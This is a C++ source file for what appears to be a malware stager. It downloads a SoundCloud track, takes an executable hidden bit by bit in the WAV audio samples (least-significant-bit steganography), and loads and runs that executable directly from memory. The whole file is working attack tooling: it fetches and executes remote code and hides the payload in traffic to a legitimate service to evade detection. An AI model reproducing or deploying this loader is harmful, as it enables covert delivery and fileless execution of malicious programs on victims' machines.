#include <iostream>
#include <fstream>
#include <cpr/cpr.h>
#include <nlohmann/json.hpp>
#include "PELoader.h"

size_t EMBEDDED_EXE_SIZE_BYTES = 38400;
size_t WAV_FILE_DATA_OFFSET = 44;

int main() {
    PELoader peLoader;
    PBYTE exeData = new BYTE[EMBEDDED_EXE_SIZE_BYTES];
    BYTE exeByte = 0;

    std::string url = "<SoundCloud Download Track URL>";

    cpr::Response r = cpr::Get(cpr::Url{ url },
        cpr::Header{ {"Host", "api-v2.soundcloud.com"} });

    if (r.status_code == 200) {
        printf("\033[32m[+] Retrieved SoundCloud redirect URI\n");
    }
    else {
        printf("\033[31m[-] Failed retrieving SoundCloud redirect URI: Error %i\n", r.status_code);
    }


    nlohmann::json data = nlohmann::json::parse(r.text);

    r = cpr::Get(cpr::Url{ data["redirectUri"] },
        cpr::Header{ {"Host", "cf-media.sndcdn.com"} });

    if (r.status_code == 200) {
        printf("\033[32m[+] Retrieved track wav file data\n");
    }
    else {
        printf("\033[31m[-] Failed retrieving wav data: Error %i\n", r.status_code);
    }

    // Intitialize the vector with only the wav file data and skip over the wav file metadata
    std::vector<BYTE> wavData(r.text.begin() + WAV_FILE_DATA_OFFSET, r.text.end());

    int idx = 0;

    // Iterate over the wave file data until the emebedded exe is reconstructed
    // Each embedded exe byte take 8 bytes from the wav file, therefore each byte of the wav file data is a single bit of the exe
    for (int i = 0; i < EMBEDDED_EXE_SIZE_BYTES * 8 + 1; i++) {

        // After 8 consecutive iterations set the reconstructed byte into the buffer
        if (i % 8 == 0 && i != 0) {
            exeData[idx] = exeByte;

            // Reset the byte back to 0
            exeByte = 0x0;

            // Increment the index
            idx++;
        }

        // Bit mask to keep only the least significant bit 
        BYTE bit = wavData[i] & 0x1;

        // Bit shift new byte to left upon each iteration to reconstruct the embedded exe byte
        bit <<= (i % 8);

        // Bit mask the least signficant bit to the original exe data
        exeByte |= bit;
    }

    // Load the PE into memory and execute
    bool success = peLoader.loadPEFromMemory(exeData);


    return 0;
}